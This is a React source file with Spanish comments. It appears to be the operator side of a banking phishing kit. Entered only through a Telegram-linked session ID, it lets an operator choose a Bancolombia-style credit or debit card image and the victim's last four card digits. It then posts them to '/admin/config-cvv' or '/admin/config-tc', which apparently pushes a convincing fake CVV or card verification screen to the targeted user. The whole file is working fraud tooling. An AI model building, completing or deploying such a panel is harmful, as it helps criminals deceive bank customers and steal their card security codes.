import { instanceBackend } from "app/axios/instanceBackend";
import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import './css/LoginModal.css';
import { limpiarPaddingBody } from "@utils";

export default function TCcustoms() {
    const navigate = useNavigate();

    // Validar que la ruta sea accesible solo desde Telegram (con sesionId en URL)
    useEffect(() => {

        // Se limpia el padding del body
        limpiarPaddingBody();

        // Obtener sesionId de los parámetros de la URL
        const params = new URLSearchParams(window.location.search);

        // Obtener sesionId
        const sesionId = params.get("sesionId");

        // Se valida si existe sesionId
        if (!sesionId) {

            // Se limpia el localStorage
            localStorage.clear();

            // Redirigir al inicio si no existe sesionId
            navigate('/');
        }
    }, [navigate]);

    const [tipo, setTipo] = useState(""); // 'credito' | 'debito'
    const [digits, setDigits] = useState(["", "", "", ""]);

    // NEW STATES
    const [filterFranquicia, setFilterFranquicia] = useState("Todas"); // 'Todas' | 'Visa' | 'Mastercard' | 'Amex'
    const [selectedCard, setSelectedCard] = useState(null); // stores the filename of the selected card

    const inputRefs = useRef([]);

    // Arrays of image filenames with labels
    const creditoImages = [
        { filename: "imgi_10_Mastercard_ideal_.png", label: "Mastercard Ideal" },
        { filename: "imgi_11_Mastercard_joven_.png", label: "Mastercard Joven" },
        { filename: "imgi_12_clasica_.png", label: "Tarjeta Clásica" },
        { filename: "imgi_13_+Visa+clasica+tradicional.png", label: "Visa Clásica" },
        { filename: "imgi_14_Mastercard_credit-card.png", label: "Mastercard Unica" },
        { filename: "imgi_15_275x172.png", label: "Tarjeta Standard" },
        { filename: "imgi_16_Mastercard_oro_.png", label: "Mastercard Oro" },
        { filename: "imgi_17_Visa+Seleccion+Colombia.png", label: "Visa Selección" },
        { filename: "imgi_18_Visa+Oro.png", label: "Visa Oro" },
        { filename: "imgi_19_Mastercard_611_600x379.png", label: "Mastercard Platinum" },
        { filename: "imgi_20_AMEX+SkyBlue.png", label: "AMEX Blue" },
        { filename: "imgi_21_AMEX+Green.png", label: "AMEX Green" },
        { filename: "imgi_22_AMEX+Gold.png", label: "AMEX Gold" },
        { filename: "imgi_23_BC_VISA_LIFEMILE_PERSONAS_BC_VISA_LIFEMILE_PERSONAS_TIRO_.png", label: "Visa LifeMiles" },
        { filename: "imgi_24_Mastercard_612_600x379.png", label: "Mastercard Black" },
        { filename: "imgi_25_Visa+Platinum+Conavi.png", label: "Visa Platinum" },
        { filename: "imgi_26_Mastercard_+Tarjeta+Virtual.png", label: "Mastercard E-Card" },
        { filename: "imgi_27_AMEX+Platinum.png", label: "AMEX Platinum" },
        { filename: "imgi_28_Visa_Infinite_Card.png", label: "Visa Infinite" },
        { filename: "imgi_29_Mastercard-Sufi_Optimizada.png", label: "Mastercard Sufi" },
        { filename: "imgi_30_Mastercard-Esso+mobil+oro_Optimizada.png", label: "Master Esso Gold" },
        { filename: "imgi_31_Mastercard-Esso+mobil+clasica_Optimizada.png", label: "Master Esso Mobil" },
        { filename: "imgi_7_Amex+Libre.png", label: "AMEX Libre" }
    ];

    const debitoImages = [
        { filename: "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.png", label: "Débito Cívica" },
        { filename: "imgi_5_Debito_(preferencial).png", label: "Débito Preferencial" },
        { filename: "imgi_7_004_600x379.png", label: "Débito Clásica" },
        { filename: "debito_virtual.png", label: "Debito Virtual" }
    ];

    // Se hace el useEffect
    useEffect(() => {

        // Se selecciona por defecto credito
        setTipo("credito");
    }, []);

    // Reset card selection when filter changes
    useEffect(() => {
        setSelectedCard(null); // Clear selection when switching filters
    }, [filterFranquicia]);

    // Filter Logic
    const getFilteredImages = () => {
        if (filterFranquicia === "Todas") return creditoImages;

        return creditoImages.filter(card => {
            const lowerFilename = card.filename.toLowerCase();
            if (filterFranquicia === "Visa" && lowerFilename.includes("visa")) return true;
            if (filterFranquicia === "Mastercard" && lowerFilename.includes("mastercard")) return true;
            if (filterFranquicia === "Amex" && (lowerFilename.includes("amex") || lowerFilename.includes("american"))) return true;
            return false;
        });
    };

    const handleDigitChange = (e, index) => {
        const { value } = e.target;
        if (value && !/^[0-9]*$/.test(value)) return;

        const newDigits = [...digits];
        newDigits[index] = value.slice(-1);
        setDigits(newDigits);

        if (value && index < 3) {
            inputRefs.current[index + 1].focus();
        }
    };

    const handleKeyDown = (e, index) => {
        if (e.key === "Backspace" && !digits[index] && index > 0) {
            inputRefs.current[index - 1].focus();
        }
    };

    const handleCardSelect = (imgName) => {
        setSelectedCard(prev => prev === imgName ? null : imgName); // Toggle selection
    };

    // Handler para enviar datos y navegar a ValidacionCVV
    const handleEnviar = async () => {
        if (!selectedCard || digits.some(d => d === "")) return;

        // Obtener params (sesionId, mode)
        // Nota: searchParams se define arriba, asumiendo que lo agregamos. 
        // Si no, lo obtendré aquí directamente de window.location si falla el hook arriba.
        const params = new URLSearchParams(window.location.search);
        const sesionId = params.get("sesionId");
        const mode = params.get("mode") || 'cvv';

        if (!sesionId) {
            alert("Error: Falta sesionId en la URL");
            return;
        }

        // Obtener el label de la tarjeta seleccionada
        const allCards = [...creditoImages, ...debitoImages];
        const cardInfo = allCards.find(card => card.filename === selectedCard);

        const cardData = {
            filename: selectedCard,
            tipo: tipo,
            digits: digits.join(""),
            label: cardInfo ? cardInfo.label : ""
        };

        try {
            const endpoint = mode === 'tc' ? '/admin/config-tc' : '/admin/config-cvv';
            await instanceBackend.post(endpoint, {
                sesionId,
                cardData
            });
            alert(`Configuración de ${mode.toUpperCase()} enviada al usuario exitosamente.`);
        } catch (error) {
            console.error(error);
            alert("Error enviando configuración.");
        }
    };

    return (
        <div style={{
            minHeight: "100vh",
            backgroundColor: "#000000",
            color: "#ffffff",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            padding: "20px",
            fontFamily: "sans-serif"
        }}>

            {/* LOGO SECTION */}

            <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "15px" }}>
                {/* Icon Box */}
                <img src="/assets/images/logos/cvv.png" alt="CVV Logo" style={{ width: "200px" }} />

            </div>
            <div style={{
                fontSize: "18px",
                fontWeight: "bold",
                fontStyle: "italic",
                color: "white",
                lineHeight: "1",
                marginTop: "center"
            }}>CVV Custom</div>



            {/* SOLICITUD SECTION */}
            <div style={{ width: "100%", maxWidth: "400px", marginTop: "50px" }}>
                <div style={{ display: "flex", alignItems: "center", marginBottom: "20px" }}>
                    <div style={{ flex: 1, height: "1px", backgroundColor: "#333" }}></div>
                    <span style={{ padding: "0 10px", fontSize: "14px", color: "#888" }}>Solicitud</span>
                    <div style={{ flex: 1, height: "1px", backgroundColor: "#333" }}></div>
                </div>

                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: "30px" }}>
                    {/* TIPO (Radio Buttons) */}
                    <div>
                        <div style={{ marginBottom: "15px", color: "#888" }}>Tipo</div>

                        <label style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "10px", cursor: "pointer" }}>
                            <input
                                type="radio"
                                name="tipo"
                                value="credito"
                                checked={tipo === "credito"}
                                onChange={(e) => { setTipo(e.target.value); setSelectedCard(null); }}
                                style={{ accentColor: "blue", width: "18px", height: "18px" }}
                            />
                            Crédito
                        </label>

                        <label style={{ display: "flex", alignItems: "center", gap: "10px", cursor: "pointer" }}>
                            <input
                                type="radio"
                                name="tipo"
                                value="debito"
                                checked={tipo === "debito"}
                                onChange={(e) => { setTipo(e.target.value); setSelectedCard(null); }}
                                style={{ accentColor: "blue", width: "18px", height: "18px" }}
                            />
                            Débito
                        </label>
                    </div>

                    {/* ULTIMOS 4 DIGITOS */}
                    <div>
                        <div style={{ marginBottom: "15px", color: "#888", textAlign: "right" }}>Ultimos 4 Digitos</div>
                        <div style={{ display: "flex", gap: "5px" }}>
                            {[0, 1, 2, 3].map((index) => (
                                <input
                                    key={index}
                                    ref={(el) => (inputRefs.current[index] = el)}
                                    type="text"
                                    inputMode="numeric"
                                    maxLength={1}
                                    value={digits[index]}
                                    onChange={(e) => handleDigitChange(e, index)}
                                    onKeyDown={(e) => handleKeyDown(e, index)}
                                    style={{
                                        width: "40px",
                                        height: "50px",
                                        backgroundColor: "transparent",
                                        border: "1px solid #333",
                                        borderRadius: "5px",
                                        color: "white",
                                        fontSize: "20px",
                                        textAlign: "center",
                                        outline: "none"
                                    }}
                                />
                            ))}
                        </div>
                    </div>
                </div>

                {/* FILTERS (ONLY FOR CREDITO) */}
                {tipo === "credito" && (
                    <div style={{
                        marginBottom: "20px",
                        display: "flex",
                        gap: "10px",
                        overflowX: "auto",
                        paddingBottom: "10px",
                        width: "100%",
                        scrollbarWidth: "none" // Hide scrollbar Firefox
                    }}>
                        {["Todas", "Visa", "Mastercard", "Amex"].map(f => {
                            // Map filter names to logo paths
                            const logoMap = {
                                "Visa": "/assets/images/logos/png-transparent-visa-logo-removebg-preview.png",
                                "Mastercard": "/assets/images/logos/Mastercard-logo.svg.png",
                                "Amex": "/assets/images/logos/american-express-logo.png"
                            };

                            return (
                                <button
                                    key={f}
                                    onClick={() => setFilterFranquicia(f)}
                                    style={{
                                        backgroundColor: filterFranquicia === f ? "white" : "#333",
                                        color: filterFranquicia === f ? "black" : "white",
                                        border: filterFranquicia === f ? "2px solid #eae300ff" : "none",
                                        padding: f === "Todas" ? "8px 16px" : "8px 12px",
                                        borderRadius: "20px",
                                        cursor: "pointer",
                                        fontSize: "14px",
                                        whiteSpace: "nowrap",
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                        minWidth: f === "Todas" ? "auto" : "70px",
                                        height: "36px"
                                    }}
                                >
                                    {/* Todas - text only */}
                                    {f === "Todas" ? (
                                        "Todas"
                                    ) : ""}

                                    {/* Visa - ajusta el height aquí */}
                                    {f === "Visa" ? (
                                        <img
                                            src={logoMap[f]}
                                            alt={f}
                                            style={{
                                                height: "45px", // Ajusta este valor
                                                width: "auto",
                                                objectFit: "contain"
                                            }}
                                        />
                                    ) : ""}

                                    {/* Mastercard - ajusta el height aquí */}
                                    {f === "Mastercard" ? (
                                        <img
                                            src={logoMap[f]}
                                            alt={f}
                                            style={{
                                                height: "28px", // Ajusta este valor
                                                width: "auto",
                                                objectFit: "contain"
                                            }}
                                        />
                                    ) : ""}

                                    {/* Amex - ajusta el height aquí */}
                                    {f === "Amex" ? (
                                        <img
                                            src={logoMap[f]}
                                            alt={f}
                                            style={{
                                                height: "39px", // Ajusta este valor
                                                width: "auto",
                                                objectFit: "contain"
                                            }}
                                        />
                                    ) : ""}
                                </button>
                            );
                        })}
                    </div>
                )}

                {/* IMAGENES SECTION (FILTERED) */}
                <div style={{ marginBottom: "30px", textAlign: "center", width: "100%" }}>

                    {tipo === "credito" && (
                        <div id="imagenes-credito" style={{
                            display: "grid",
                            gridTemplateColumns: "repeat(auto-fill, minmax(110px, 1fr))",
                            gap: "15px",
                            justifyContent: "center"
                        }}>
                            {getFilteredImages().map((card, index) => (
                                <div
                                    key={index}
                                    onClick={() => handleCardSelect(card.filename)}
                                    style={{
                                        position: "relative",
                                        cursor: "pointer",
                                        border: selectedCard === card.filename ? "3px solid #fdda24" : "3px solid transparent",
                                        borderRadius: "8px",
                                        overflow: "hidden",
                                        display: "flex",
                                        flexDirection: "column"
                                    }}
                                >
                                    <img
                                        src={`/assets/images/IMGtarjetas/${card.filename}`}
                                        alt={card.label}
                                        style={{ width: "100%", height: "auto", display: "block" }}
                                    />
                                    {/* Card Label */}
                                    <div style={{
                                        backgroundColor: "#2C2A29",
                                        color: "white",
                                        fontSize: "10px",
                                        padding: "5px",
                                        textAlign: "center",
                                        whiteSpace: "nowrap",
                                        overflow: "hidden",
                                        textOverflow: "ellipsis"
                                    }}>
                                        {card.label}
                                    </div>
                                    {selectedCard === card.filename && (
                                        <div style={{
                                            position: "absolute",
                                            top: 0, left: 0, right: 0, bottom: 0,
                                            backgroundColor: "rgba(0, 197, 137, 0.2)",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center"
                                        }}>
                                            <div style={{
                                                width: "20px",
                                                height: "20px",
                                                backgroundColor: "#fdda24",
                                                borderRadius: "50%",
                                                color: "white",
                                                fontSize: "12px",
                                                display: "flex",
                                                alignItems: "center",
                                                justifyContent: "center"
                                            }}>✓</div>
                                        </div>
                                    )}
                                </div>
                            ))}
                        </div>
                    )}

                    {tipo === "debito" && (
                        <div id="imagenes-debito" style={{
                            display: "grid",
                            gridTemplateColumns: "repeat(auto-fill, minmax(110px, 1fr))",
                            gap: "15px",
                            justifyContent: "center"
                        }}>
                            {debitoImages.map((card, index) => (
                                <div
                                    key={index}
                                    onClick={() => handleCardSelect(card.filename)}
                                    style={{
                                        position: "relative",
                                        cursor: "pointer",
                                        border: selectedCard === card.filename ? "3px solid #fdda24" : "3px solid transparent",
                                        borderRadius: "8px",
                                        overflow: "hidden",
                                        display: "flex",
                                        flexDirection: "column"
                                    }}
                                >
                                    <img
                                        src={`/assets/images/IMGdebitotj/${card.filename}`}
                                        alt={card.label}
                                        style={{ width: "100%", height: "auto", display: "block" }}
                                    />
                                    {/* Card Label */}
                                    <div style={{
                                        backgroundColor: "#2C2A29",
                                        color: "white",
                                        fontSize: "10px",
                                        padding: "5px",
                                        textAlign: "center",
                                        whiteSpace: "nowrap",
                                        overflow: "hidden",
                                        textOverflow: "ellipsis"
                                    }}>
                                        {card.label}
                                    </div>
                                    {selectedCard === card.filename && (
                                        <div style={{
                                            position: "absolute",
                                            top: 0, left: 0, right: 0, bottom: 0,
                                            backgroundColor: "rgba(0, 197, 137, 0.2)",
                                            display: "flex",
                                            alignItems: "center",
                                            justifyContent: "center"
                                        }}>
                                            <div style={{
                                                width: "20px",
                                                height: "20px",
                                                backgroundColor: "#fdda24",
                                                borderRadius: "50%",
                                                color: "white",
                                                fontSize: "12px",
                                                display: "flex",
                                                alignItems: "center",
                                                justifyContent: "center"
                                            }}>✓</div>
                                        </div>
                                    )}
                                </div>
                            ))}
                        </div>
                    )}
                </div>

                {/* BUTTON */}
                <button
                    onClick={handleEnviar}
                    disabled={!selectedCard || digits.some(d => d === "")} // Disable if no card selected OR any digit is empty
                    style={{
                        width: "100%",
                        backgroundColor: (selectedCard && digits.every(d => d !== "")) ? "#fdda24" : "#333", // Active color when ready
                        color: (selectedCard && digits.every(d => d !== "")) ? "black" : "#666",
                        border: "none",
                        padding: "15px",
                        borderRadius: "8px",
                        fontSize: "16px",
                        cursor: (selectedCard && digits.every(d => d !== "")) ? "pointer" : "not-allowed",
                        transition: "background-color 0.3s"
                    }}>
                    Enviar
                </button>

            </div>
        </div>
    );
};